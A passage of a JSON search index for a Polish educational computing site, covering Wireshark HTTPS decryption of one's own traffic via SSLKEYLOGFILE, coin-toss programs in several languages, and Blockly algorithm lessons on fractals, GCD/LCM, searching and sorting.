b\u0119d\u0105 zaszyfrowane. W celu odszyfrowania tych danych nale\u017cy wykona\u0107 nast\u0119puj\u0105ce czynno\u015bci.</p>"},{"location":"networking/wireshark/https/#1-ustawiamy-zmienna-srodowiskowa-sslkeylogfile","title":"1. Ustawiamy zmienn\u0105 \u015brodowiskow\u0105 SSLKEYLOGFILE","text":"<ol> <li>W menu start wyszukujemy \"Edytuj zmienne \u015brodowiskowe systemu\".</li> <li>Klikamy przycisk \"Zmienne \u015brodowiskowe\".</li> <li>Dodajemy now\u0105 zmienn\u0105 \u015brodowiskow\u0105 dla zalogowanego u\u017cytkownika klikaj\u0105c pierwszy od g\u00f3ry przycisk \"Nowa...\".</li> <li>W pole \"Nazwa zmiennej\" wpisujemy SSLKEYLOGFILE</li> <li>W pole \"Warto\u015b\u0107 zmiennej\" wpisujemy \u015bcie\u017ck\u0119 do pliku, w kt\u00f3rym b\u0119dziemy przechowywa\u0107 logi dotycz\u0105ce po\u0142\u0105cze\u0144 SSL, np. <code>C:\\Users\\[NazwaU\u017cytkownika]\\Documents\\Wireshark\\ssl-keys.log</code>.</li> <li>Zatwierdzamy dodanie zmiennej przyciskiem \"OK\".</li> </ol>"},{"location":"networking/wireshark/https/#2-weryfikujemy-pojawienie-sie-pliku-z-logami","title":"2. Weryfikujemy pojawienie si\u0119 pliku z logami","text":"<ol> <li>Otwieramy przegl\u0105dark\u0119, np. Google Chrome.</li> <li>Wchodzimy na stron\u0119 zabezpieczon\u0105 przez https, np. https://pl.wikipedia.org/wiki/Wikipedia:Strona_g%C5%82%C3%B3wna</li> <li>Otwieramy \u015bcie\u017ck\u0119, kt\u00f3r\u0105 podali\u015bmy w polu \"Warto\u015b\u0107 zmiennej\".</li> <li>Powinni\u015bmy zobaczy\u0107 plik z logami, np. \"ssl-keys.log\".</li> </ol>"},{"location":"networking/wireshark/https/#3-zmieniamy-ustawienia-programu-wireshark","title":"3. Zmieniamy ustawienia programu Wireshark","text":"<ol> <li>W programie Wireshark wchodzimy w menu \"Edytuj-&gt;Preferencje..\".</li> <li>W menu po lewej rozwijamy \"Protocols\" i wybieramy \"TLS\".</li> <li>W opcji \"(Pre)-Maste-Secret log filename\" klikamy przycisk \"Przegl\u0105daj\" i wybieramy plik z logami utworzony wcze\u015bniej przez przegl\u0105dark\u0119.</li> <li>Zatwierdzamy zmiany przyciskiem \"OK\".</li> </ol>"},{"location":"other/common-computer-problems/","title":"Typowe problemy z komputerem","text":"<p>Kto z nas nie mia\u0142 kiedy\u015b problem\u00f3w z komputerem? W poni\u017cszej prezentacji przyjrzymy si\u0119 wybranym problemom, ich potencjalnych przyczynom i rozwi\u0105zaniom.</p>"},{"location":"other/common-computer-problems/#prezentacja","title":"Prezentacja","text":"<p> Prezentacja</p>"},{"location":"other/computer-components/","title":"Budowa komputera","text":"<p>Korzystaj\u0105c z komputera warto wiedzie\u0107 co piszczy w \u015brodku.</p>"},{"location":"other/computer-components/#prezentacja","title":"Prezentacja","text":"<p> Prezentacja</p>"},{"location":"other/copyright/","title":"Prawa autorskie","text":"<p>Prawa autorskie i w\u0142a\u015bciwe pos\u0142ugiwanie si\u0119 nimi oraz przestrzeganie ich jest bardzo wa\u017cne, szczeg\u00f3lnie we wsp\u00f3\u0142czesnym \u015bwiecie, gdzie publiczne umieszczanie materia\u0142\u00f3w jest proste, powszechne i dost\u0119pne praktycznie dla ka\u017cdego.</p>"},{"location":"other/copyright/#prezentacja","title":"Prezentacja","text":"<p> Prezentacja</p>"},{"location":"other/copyright/#creative-commons","title":"Creative Commons","text":""},{"location":"other/fake-news-and-post-truth/","title":"Fake news i postprawda","text":"<p>Czym jest tzw. Fake News? Co nazywamy postprawd\u0105 i czym si\u0119 ona charakteryzuje? Te tematy s\u0105 niezwykle wa\u017cne w erze powszechnego dost\u0119pu do informacji, tak\u017ce tych niezweryfikowanych, b\u0142\u0119dnych, wprowadzaj\u0105cych w b\u0142\u0105d lub po prostu fa\u0142szywych.</p>"},{"location":"other/fake-news-and-post-truth/#prezentacja","title":"Prezentacja","text":"<p> Prezentacja</p>"},{"location":"other/functional-programming-introduction/","title":"Programowanie funkcyjne - wprowadzenie","text":"<p>Programowanie funkcyjne to jeden z paradygmat\u00f3w programowania. Poni\u017csza prezentacja zawiera kr\u00f3tkie wprowadzenie do tego tematu.</p>"},{"location":"other/functional-programming-introduction/#prezentacja","title":"Prezentacja","text":"<p> Programowanie Funkcyjne - Wprowadzenie</p>"},{"location":"other/presentation-rules/","title":"Zasady tworzenia prezentacji","text":"<p>Jak stworzy\u0107 \u0142adn\u0105, schludn\u0105 i czyteln\u0105 prezentacj\u0119? Mog\u0142oby si\u0119 wydawa\u0107, \u017ce odpowied\u017a na to pytanie nie jest trudna. Niemniej tworz\u0105c prezentacj\u0119 pope\u0142niamy cz\u0119sto r\u00f3\u017cne b\u0142\u0119dy, kt\u00f3re zosta\u0142y pokazana na poni\u017cszej antyprezentacji.</p>"},{"location":"other/presentation-rules/#prezentacja","title":"Prezentacja","text":"<p> Anty-Prezentacja</p>"},{"location":"programming/","title":"Wst\u0119p","text":"<p>Programowanie to sztuka. Programista jest niczym artysta, kt\u00f3ry bierze puste p\u0142\u00f3tno a zostawia na nim arcydzie\u0142o.</p> <p>Zanim zaczniemy przygod\u0119 z programowaniem, przyjrzyjmy si\u0119 dost\u0119pnym \"narz\u0119dziom\", tzn. j\u0119zykom programowania. Oczywi\u015bcie nie om\u00f3wimy wszystkich, nie mia\u0142oby to wi\u0119kszego sensu. Skupimy si\u0119 na pewnych klasykach.</p> <p>Poszczeg\u00f3lne j\u0119zyki por\u00f3wnamy ze sob\u0105, przygl\u0105daj\u0105c si\u0119 implementacji prostego programu: symulatora rzutu monet\u0105. Nie b\u0119dziemy tutaj skupia\u0107 si\u0119 na dok\u0142adnym om\u00f3wieniu implementacji i poszczeg\u00f3lnych instrukcji. Celem jest spojrzenie na r\u00f3\u017cne j\u0119zyki z lotu ptaka.</p> <p>Idea dzia\u0142ania programu jest prosta. Na pocz\u0105tku losujemy liczb\u0119 ca\u0142kowit\u0105: 0 lub 1, ma to symulowa\u0107 nasz rzut monet\u0105. Nast\u0119pnie, w zale\u017cno\u015bci od wylosowanej warto\u015bci, wypisujemy stosowny komunikat na ekran. Je\u017celi wylosowali\u015bmy 0, to znaczy, \u017ce wypad\u0142 Orze\u0142. W przeciwnym przypadku (tzn., gdy wylosowali\u015bmy 1) wypad\u0142a Reszka.</p> <p>Zach\u0119camy do przetestowania poni\u017cszych program\u00f3w. Pod ka\u017cd\u0105 implementacj\u0105 znajduje si\u0119 link do tej\u017ce implementacji na serwisie Ideone. Tam mo\u017cna uruchomi\u0107 dany program, co najlepiej zrobi\u0107 kilkukrotnie by zobaczy\u0107, jakie warto\u015bci (Orze\u0142 czy Reszka) b\u0119d\u0105 drukowane na ekranie.</p>"},{"location":"programming/#python-3","title":"Python 3","text":"<pre><code>import random\n\nmoneta = random.randint(0, 1)\n\nif moneta == 0:\n    print(\"Orzel\")\nelse:\n    print(\"Reszka\")\n</code></pre> <p>Symulator rzutu monet\u0105 - Python</p>"},{"location":"programming/#c","title":"C++","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;ctime&gt;\n#include &lt;random&gt;\nusing namespace std;\n\nint main() {\n    srand(time(NULL));\n\n    int moneta;\n    moneta = rand() % 2;\n\n    if(moneta == 0) {\n        cout &lt;&lt; \"Orzel\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"Reszka\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre> <p>Symulator rzutu monet\u0105 - C++</p>"},{"location":"programming/#java","title":"Java","text":"<pre><code>import java.util.*;\nimport java.lang.*;\nimport java.io.*;\n\nclass Main {\n    public static void main (String[] args) throws java.lang.Exception {\n        Random rd = new Random();\n\n        int moneta = rd.nextInt(2);\n\n        if(moneta == 0) {\n            System.out.println(\"Orzel\");\n        } else {\n                System.out.println(\"Reszka\");\n        }\n    }\n}\n</code></pre> <p>Symulator rzutu monet\u0105 - Java</p>"},{"location":"programming/#pascal","title":"Pascal","text":"<pre><code>program rzut;\n    var moneta : integer;\nbegin\n    randomize();\n\n    moneta := random(2);\n\n    if moneta = 0 then write('Orzel')\n    else write ('Reszka')\nend.\n</code></pre> <p>Symulator rzutu monet\u0105 - Pascal</p>"},{"location":"programming/#blockly","title":"Blockly","text":"<p>Symulator rzutu monet\u0105 - Blockly</p>"},{"location":"programming/blockly/","title":"Blockly","text":"<p>Blockly to biblioteka programistyczna stworzona przez Google, kt\u00f3ra umo\u017cliwia tworzenie wizualnych edytor\u00f3w do programowania za pomoc\u0105 blok\u00f3w. Ka\u017cdy blok reprezentuje pewien fragment kodu, kt\u00f3ry mo\u017ce by\u0107 po\u0142\u0105czony z innymi blokami, tworz\u0105c w ten spos\u00f3b kompleksowe programy.</p> <p>Oficjalna strona Blockly</p>"},{"location":"programming/blockly/#zastosowanie-w-edukacji","title":"Zastosowanie w edukacji","text":"<p>Blockly ma wiele zastosowa\u0144 w edukacji, szczeg\u00f3lnie w nauczaniu programowania. Poni\u017cej przedstawiam kilka kluczowych aspekt\u00f3w:</p> <ol> <li> <p>Intuicyjno\u015b\u0107: dzi\u0119ki swojemu wizualnemu i interaktywnemu interfejsowi, Blockly jest \u0142atwy do zrozumienia i u\u017cycia, nawet dla os\u00f3b, kt\u00f3re nigdy wcze\u015bniej nie programowa\u0142y. To sprawia, \u017ce jest doskona\u0142ym narz\u0119dziem dla nauczycieli, kt\u00f3rzy chc\u0105 wprowadzi\u0107 swoich uczni\u00f3w w \u015bwiat programowania.</p> </li> <li> <p>Bezkodowe programowanie: Blockly eliminuje potrzeb\u0119 pisania kodu z palca, co cz\u0119sto stanowi barier\u0119 dla pocz\u0105tkuj\u0105cych programist\u00f3w. Zamiast tego, uczniowie mog\u0105 skupi\u0107 si\u0119 na logice programu i na zrozumieniu, jak r\u00f3\u017cne cz\u0119\u015bci programu wsp\u00f3\u0142pracuj\u0105 ze sob\u0105.</p> </li> <li> <p>Elastyczno\u015b\u0107: Blockly jest niezwykle elastycznym narz\u0119dziem, kt\u00f3re mo\u017ce by\u0107 dostosowane do wielu r\u00f3\u017cnych zastosowa\u0144 edukacyjnych. Nauczyciele mog\u0105 tworzy\u0107 w\u0142asne bloki i narz\u0119dzia, kt\u00f3re s\u0105 najbardziej odpowiednie dla ich lekcji.</p> </li> <li> <p>Kompatybilno\u015b\u0107 z innymi j\u0119zykami programowania: Blockly mo\u017ce generowa\u0107 kod w r\u00f3\u017cnych j\u0119zykach programowania, takich jak JavaScript, Python, PHP, Lua i Dart. To pozwala uczniom na \u0142atwe przej\u015bcie od programowania wizualnego do programowania tekstowego.</p> </li> </ol> <p>W zwi\u0105zku z powy\u017cszym, Blockly jest doskona\u0142ym narz\u0119dziem do nauczania podstaw programowania, zar\u00f3wno dla m\u0142odszych, jak i starszych uczni\u00f3w. Blockly jest z powodzeniem u\u017cywany w wielu projektach edukacyjnych na ca\u0142ym \u015bwiecie, takich jak Scratch czy Code.org.</p>"},{"location":"programming/blockly/algorithms/fractals/binary-tree/","title":"Drzewo binarne","text":""},{"location":"programming/blockly/algorithms/fractals/binary-tree/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/binary-tree/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/fractals/binary-tree/#drzewo-binarne_1","title":"Drzewo binarne","text":""},{"location":"programming/blockly/algorithms/fractals/binary-tree/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/fractals/binary-tree/#link-do-implementacji","title":"Link do implementacji","text":"<p>Drzewo binarne</p>"},{"location":"programming/blockly/algorithms/fractals/cantor-dust/","title":"Zbi\u00f3r Cantora","text":""},{"location":"programming/blockly/algorithms/fractals/cantor-dust/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/cantor-dust/#implementacja","title":"Implementacja","text":"<p>TODO</p>"},{"location":"programming/blockly/algorithms/fractals/dragon-curve/","title":"Smocza Krzywa","text":""},{"location":"programming/blockly/algorithms/fractals/dragon-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/dragon-curve/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/fractals/dragon-curve/#smocza-krzywa_1","title":"Smocza Krzywa","text":""},{"location":"programming/blockly/algorithms/fractals/dragon-curve/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/fractals/dragon-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>Smocza Krzywa</p>"},{"location":"programming/blockly/algorithms/fractals/koch-curve/","title":"Krzywa Kocha","text":""},{"location":"programming/blockly/algorithms/fractals/koch-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/koch-curve/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/fractals/koch-curve/#krzywa-kocha_1","title":"Krzywa Kocha","text":""},{"location":"programming/blockly/algorithms/fractals/koch-curve/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/fractals/koch-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>Krzywa Kocha</p>"},{"location":"programming/blockly/algorithms/fractals/koch-snowflake/","title":"P\u0142atek Kocha","text":""},{"location":"programming/blockly/algorithms/fractals/koch-snowflake/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/koch-snowflake/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/fractals/koch-snowflake/#krzywa-kocha","title":"Krzywa Kocha","text":""},{"location":"programming/blockly/algorithms/fractals/koch-snowflake/#patek-kocha_1","title":"P\u0142atek Kocha","text":""},{"location":"programming/blockly/algorithms/fractals/koch-snowflake/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/fractals/koch-snowflake/#link-do-implementacji","title":"Link do implementacji","text":"<p>P\u0142atek Kocha</p>"},{"location":"programming/blockly/algorithms/fractals/minkowski-sausage/","title":"Minkowski Sausage","text":""},{"location":"programming/blockly/algorithms/fractals/minkowski-sausage/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/minkowski-sausage/#implementacja","title":"Implementacja","text":"<p>TODO</p>"},{"location":"programming/blockly/algorithms/fractals/peano-curve/","title":"Krzywa Peano","text":""},{"location":"programming/blockly/algorithms/fractals/peano-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/peano-curve/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/fractals/peano-curve/#krzywa-peano_1","title":"Krzywa Peano","text":""},{"location":"programming/blockly/algorithms/fractals/peano-curve/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/fractals/peano-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>Krzywa Peano</p>"},{"location":"programming/blockly/algorithms/fractals/sierpinski-square/","title":"Kwadrat Sierpi\u0144skiego","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-square/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-square/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-square/#kwadrat-sierpinskiego_1","title":"Kwadrat Sierpi\u0144skiego","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-square/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-square/#link-do-implementacji","title":"Link do implementacji","text":"<p>Kwadrat Sierpi\u0144skiego</p>"},{"location":"programming/blockly/algorithms/fractals/sierpinski-triangle/","title":"Tr\u00f3jk\u0105t Sierpi\u0144skiego","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-triangle/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-triangle/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-triangle/#trojkat-sierpinskiego_1","title":"Tr\u00f3jk\u0105t Sierpi\u0144skiego","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-triangle/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/fractals/sierpinski-triangle/#link-do-implementacji","title":"Link do implementacji","text":"<p>Tr\u00f3jk\u0105t Sierpi\u0144skiego</p>"},{"location":"programming/blockly/algorithms/integers/gcd/","title":"NWD","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#nwd-z-odejmowaniem","title":"NWD z odejmowaniem","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#nwd_1","title":"NWD","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#link-do-implementacja","title":"Link do implementacja","text":"<p>NWD z odejmowaniem</p>"},{"location":"programming/blockly/algorithms/integers/gcd/#algorytm-euklidesa-nwd-z-modulo-wersja-iteracyjna","title":"Algorytm Euklidesa (NWD z modulo) - wersja iteracyjna","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#nwd_2","title":"NWD","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#kod-gowny_1","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#link-do-implementacji","title":"Link do implementacji","text":"<p>Algorytm Euklidesa - wersja iteracyjna</p>"},{"location":"programming/blockly/algorithms/integers/gcd/#algorytm-euklidesa-nwd-z-modulo-wersja-rekurencyjna","title":"Algorytm Euklidesa (NWD z modulo) - wersja rekurencyjna","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#nwd_3","title":"NWD","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#kod-gowny_2","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/integers/gcd/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Algorytm Euklidesa - wersja rekurencyjna</p>"},{"location":"programming/blockly/algorithms/integers/lcm/","title":"NWW","text":""},{"location":"programming/blockly/algorithms/integers/lcm/#opis-problemu","title":"Opis problemu","text":"<p>TODO</p>"},{"location":"programming/blockly/algorithms/integers/lcm/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/integers/lcm/#nww_1","title":"NWW","text":""},{"location":"programming/blockly/algorithms/integers/lcm/#nwd","title":"NWD","text":"<p>Skoro mamy ju\u017c policzone NWW, mo\u017cemy na jego podstawie policzy\u0107 tak\u017ce NWD (Najmniejszy Wsp\u00f3lny Dzielnik), korzystaj\u0105c z prostego wzoru:</p> \\[ NWD(a,b)=\\frac{a*b}{NWW(a,b)} \\] <p></p>"},{"location":"programming/blockly/algorithms/integers/lcm/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":"<p>Pozostaje nam tylko poprosi\u0107 u\u017cytkownika o podanie danych i wywo\u0142a\u0107 dwie pokazane wy\u017cej funkcje.</p> <p></p>"},{"location":"programming/blockly/algorithms/integers/lcm/#link-do-implementacji","title":"Link do implementacji","text":"<p>Obliczanie NWW i NWD</p>"},{"location":"programming/blockly/algorithms/searching/binary-search/","title":"Wyszukiwanie binarne","text":""},{"location":"programming/blockly/algorithms/searching/binary-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/searching/binary-search/#wersja-iteracyjna","title":"Wersja iteracyjna","text":""},{"location":"programming/blockly/algorithms/searching/binary-search/#wyszukiwanie","title":"Wyszukiwanie","text":""},{"location":"programming/blockly/algorithms/searching/binary-search/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/searching/binary-search/#link-do-kodu","title":"Link do kodu","text":"<p>Wyszukiwanie binarne - wersja iteracyjna</p>"},{"location":"programming/blockly/algorithms/searching/binary-search/#wersja-rekurencyjna","title":"Wersja rekurencyjna","text":""},{"location":"programming/blockly/algorithms/searching/binary-search/#wyszukiwanie_1","title":"Wyszukiwanie","text":""},{"location":"programming/blockly/algorithms/searching/binary-search/#kod-gowny_1","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/searching/binary-search/#link-do-implementacji","title":"Link do implementacji","text":"<p>Wyszukiwanie binarne - wersja rekurencyjna</p>"},{"location":"programming/blockly/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#wyszukiwanie","title":"Wyszukiwanie","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#link-do-implementacji","title":"Link do implementacji","text":"<p>Wyszukiwanie liniowe - istnienie elementu</p>"},{"location":"programming/blockly/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja SzukajLiniowo zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przypisujemy do zmiennej wynik warto\u015b\u0107 fa\u0142sz oznaczaj\u0105c\u0105, \u017ce nie znale\u017ali\u015bmy poszukiwanego elementu. W tym momencie jest to zrozumia\u0142e, jako \u017ce jeszcze nie zacz\u0119li\u015bmy poszukiwa\u0144. Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(1\\) do d\u0142ugo\u015bci tablicy w\u0142\u0105cznie. D\u0142ugo\u015b\u0107 tablicy pobieramy korzystaj\u0105c z polecenia/bloku d\u0142ugo\u015b\u0107. Dla ka\u017cdego indeksu (zapisanego w zmiennej i) sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107. Je\u017celi tak, to przypisujemy do zmiennej wynik warto\u015b\u0107 prawda i przerywamy dzia\u0142anie p\u0119tli. Po wyj\u015bciu z p\u0119tli (tzn. gdy przeszli\u015bmy przez wszystkie indeksy, lub zako\u0144czyli\u015bmy dzia\u0142anie p\u0119tli wcze\u015bniej) zwracamy jako wynik funkcji warto\u015b\u0107 zmiennej wynik.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 oraz warto\u015b\u0107 poszukiwanego elementu. Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 SzukajLiniowo z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w zmiennej wynik. W zale\u017cno\u015bci od wyniku wypisujemy odpowiedni komunikat.</p>"},{"location":"programming/blockly/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#wyszukiwanie_1","title":"Wyszukiwanie","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#kod-gowny_1","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#link-do-implementacji_1","title":"Link do implementacji","text":"<p>Wyszukiwanie liniowe - pozycja elementu</p>"},{"location":"programming/blockly/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja SzukajLiniowo zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przypisujemy do zmiennej wynik warto\u015b\u0107 \\(-1\\)_ _oznaczaj\u0105c\u0105, \u017ce nie znale\u017ali\u015bmy poszukiwanego elementu. W tym momencie jest to zrozumia\u0142e, jako \u017ce jeszcze nie zacz\u0119li\u015bmy poszukiwa\u0144. Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(1\\) do d\u0142ugo\u015bci tablicy w\u0142\u0105cznie. D\u0142ugo\u015b\u0107 tablicy pobieramy korzystaj\u0105c z polecenia/bloku d\u0142ugo\u015b\u0107. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107. Je\u017celi tak, to przypisujemy do zmiennej wynik warto\u015b\u0107 indeksu zapisan\u0105 w zmiennej i, a nast\u0119pnie przerywamy dzia\u0142anie p\u0119tli. Po wyj\u015bciu z p\u0119tli (tzn. gdy przeszli\u015bmy przez wszystkie indeksy, lub zako\u0144czyli\u015bmy dzia\u0142anie p\u0119tli wcze\u015bniej) zwracamy jako wynik funkcji warto\u015b\u0107 zmiennej wynik.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 oraz warto\u015b\u0107 poszukiwanego elementu. Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 SzukajLiniowo z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w zmiennej pozycja. W zale\u017cno\u015bci od wyniku wypisujemy odpowiedni komunikat.</p>"},{"location":"programming/blockly/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#wyszukiwanie_2","title":"Wyszukiwanie","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#kod-gowny_2","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/searching/linear-search/#link-do-implementacji_2","title":"Link do implementacji","text":"<p>Wyszukiwanie liniowe - wszystkie pozycje elementu</p>"},{"location":"programming/blockly/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja SzukajLiniowo nie zwraca wyniku i przyjmuje dwa argumenty: tablic\u0119 do przeszukania oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(1\\) do d\u0142ugo\u015bci tablicy w\u0142\u0105cznie. D\u0142ugo\u015b\u0107 tablicy pobieramy korzystaj\u0105c z polecenia/bloku d\u0142ugo\u015b\u0107. Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107. Je\u017celi tak, to wypisujemy warto\u015b\u0107 indeksu zapisan\u0105 w zmiennej i.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 oraz warto\u015b\u0107 poszukiwanego elementu. Nast\u0119pnie wypisujemy stosowny komunikat i wywo\u0142ujemy funkcj\u0119 SzukajLiniowo z wcze\u015bniej przygotowanymi parametrami.</p>"},{"location":"programming/blockly/algorithms/searching/min-or-max/","title":"Wyszukiwanie minimum i maksimum","text":""},{"location":"programming/blockly/algorithms/searching/min-or-max/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/searching/min-or-max/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/searching/min-or-max/#znajdowanie-minimum","title":"Znajdowanie minimum","text":""},{"location":"programming/blockly/algorithms/searching/min-or-max/#znajdowanie-maksimum","title":"Znajdowanie maksimum","text":""},{"location":"programming/blockly/algorithms/searching/min-or-max/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/searching/min-or-max/#link-do-implementacji","title":"Link do implementacji","text":"<p>Znajdowanie minimum i maksimum</p>"},{"location":"programming/blockly/algorithms/sorting/counting-sort/","title":"Sortowanie przez zliczanie","text":""},{"location":"programming/blockly/algorithms/sorting/counting-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/sorting/counting-sort/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/sorting/counting-sort/#sortowanie","title":"Sortowanie","text":""},{"location":"programming/blockly/algorithms/sorting/counting-sort/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/sorting/counting-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie przez zliczanie</p>"},{"location":"programming/blockly/algorithms/sorting/selection-sort/","title":"Sortowanie przez wybieranie","text":""},{"location":"programming/blockly/algorithms/sorting/selection-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/blockly/algorithms/sorting/selection-sort/#implementacja","title":"Implementacja","text":""},{"location":"programming/blockly/algorithms/sorting/selection-sort/#sortowanie","title":"Sortowanie","text":""},{"location":"programming/blockly/algorithms/sorting/selection-sort/#kod-gowny","title":"Kod g\u0142\u00f3wny","text":""},{"location":"programming/blockly/algorithms/sorting/selection-sort/#link-do-implementacji","title":"Link do implementacji","text":"<p>Sortowanie przez zliczanie</p>"},{"location":"programming/blockly/blockly-games/animation/","title":"Animacja","text":""},{"location":"programming/blockly/blockly-games/animation/#prezentacja-rozwiazan","title":"Prezentacja rozwi\u0105za\u0144","text":"<p> Blockly Animacja - rozwi\u0105zania zada\u0144</p>"},{"location":"programming/blockly/blockly-games/bird/","title":"Ptak","text":""},{"location":"programming/blockly/blockly-games/bird/#prezentacja-rozwiazan","title":"Prezentacja rozwi\u0105za\u0144","text":"<p> Blockly Ptak - rozwi\u0105zania 